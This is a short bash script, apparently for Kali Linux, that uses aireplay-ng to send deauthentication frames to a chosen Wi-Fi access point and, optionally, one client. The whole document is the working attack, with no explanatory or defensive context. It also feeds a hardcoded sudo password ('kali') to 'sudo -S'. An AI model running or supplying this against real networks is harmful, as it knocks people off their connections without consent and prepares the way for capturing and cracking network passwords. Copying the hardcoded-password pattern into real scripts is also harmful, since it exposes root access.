#! /bin/bash

if [ $# -eq 2 ]; then
    echo 'kali' | sudo -S aireplay-ng -0 2 -a $1 -c $2 wlan0
elif [ $# -eq 1 ]; then
    echo 'kali' | sudo -S aireplay-ng -0 2 -a $1 wlan0
else
    echo 'Wrong input'
fi
